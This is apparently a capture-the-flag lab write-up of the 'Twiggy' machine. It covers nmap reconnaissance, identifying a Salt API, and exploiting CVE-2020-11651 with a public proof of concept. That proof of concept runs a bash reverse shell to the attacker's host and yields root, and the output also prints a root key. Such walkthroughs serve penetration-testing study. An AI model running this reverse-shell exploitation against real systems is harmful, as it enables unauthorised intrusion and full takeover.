# Twiggy

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 4000 192.168.219.62
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-05 11:10 +08
Nmap scan report for 192.168.219.62
Host is up (0.17s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
80/tcp   open  http
4505/tcp open  unknown
4506/tcp open  unknown
8000/tcp open  http-alt
```

Did a detailed `nmap` scan as well:

```
$ sudo nmap -p 22,53,80,4505,4506,8000 -sC -sV --min-rate 3000 192.168.219.62      
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-05 11:11 +08
Nmap scan report for 192.168.219.62
Host is up (0.18s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 447d1a569b68aef53bf6381773165d75 (RSA)
|   256 1c789d838152f4b01d8e3203cba61893 (ECDSA)
|_  256 08c912d97b9898c8b3997a19822ea3ea (ED25519)
53/tcp   open  domain  NLnet Labs NSD
80/tcp   open  http    nginx 1.16.1
|_http-title: Home | Mezzanine
|_http-server-header: nginx/1.16.1
4505/tcp open  zmtp    ZeroMQ ZMTP 2.0
4506/tcp open  zmtp    ZeroMQ ZMTP 2.0
8000/tcp open  http    nginx 1.16.1
|_http-title: Site doesn't have a title (application/json).
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.16.1
```

### Salt API -> RCE

Port 8000 looked the most interesting since it was only returning JSON data. Visiting it just shows a few 'clients':

<figure><img src="../../../.gitbook/assets/image (937).png" alt=""><figcaption></figcaption></figure>

When we view the headers, we can see that this is using a program called Salt API:

<figure><img src="../../../.gitbook/assets/image (3620).png" alt=""><figcaption></figcaption></figure>

There are some exploits for Salt here:

```
$ searchsploit salt    
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
Oracle MySQL / MariaDB - Insecure Salt Generation Security | linux/remote/38109.pl
SaltOS - 'download.php' Cross-Site Scripting               | php/webapps/37642.txt
SaltOS Erp Crm 3.1 r8126 - Database File Download          | php/webapps/45734.txt
SaltOS Erp Crm 3.1 r8126 - SQL Injection                   | php/webapps/45731.txt
SaltOS Erp Crm 3.1 r8126 - SQL Injection (2)               | php/webapps/45733.txt
Saltstack 3000.1 - Remote Code Execution                   | multiple/remote/48421.txt
----------------------------------------------------------- ---------------------------------
```

The last one looks like the most reliable, and it works:

```
$ python3 poc.py --master 192.168.219.62 --exec 'bash -i >& /dev/tcp/192.168.45.182/80 0>&1'
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
/home/kali/.local/lib/python3.11/site-packages/salt/transport/client.py:27: DeprecationWarning: This module is deprecated. Please use salt.channel.client instead.
  warn_until(
[+] Checking salt-master (192.168.219.62:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651... YES
[*] root key obtained: EhN8Uknfm4lWhieX13oN5C+NiHo63BzPifodAAOygyu3DL3ZUnCX4BEV9cvD/zT4NfCHQ22Hq7s=
[+] Attemping to execute bash -i >& /dev/tcp/192.168.45.182/80 0>&1 on 192.168.219.62
[+] Successfully scheduled job: 20230705031527947368
```

<figure><img src="../../../.gitbook/assets/image (782).png" alt=""><figcaption></figcaption></figure>

Rooted!
